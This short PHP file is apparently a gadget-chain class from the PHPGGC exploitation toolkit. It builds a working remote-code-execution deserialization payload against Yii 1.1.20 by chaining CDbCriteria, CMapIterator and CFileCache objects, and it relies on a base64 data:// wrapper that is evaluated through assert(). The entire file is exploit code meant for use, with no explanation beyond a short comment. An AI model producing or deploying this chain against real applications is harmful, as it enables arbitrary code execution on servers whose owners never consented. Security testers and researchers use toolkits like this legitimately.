<?php

namespace GadgetChain\Yii;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.20';
    public static $vector = '__wakeup';
    public static $author = 'cf';
    public static $information = '
        As the payload uses file_get_contents("data://..."), allow_url_fopen
        must be ON.
    ';

    public function generate(array $parameters)
    {
    	// When hitting the file cache, our data:// wrapper will be fetched,
    	// and it will be unserialized with assert().
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        $parameter = '9999999999' . $parameter;
        $parameter = base64_encode($parameter);

        $a = new \CFileCache($function, $parameter);
        $b = new \CMapIterator($a);
        $c = new \CDbCriteria($b);

        return $c;
    }
}
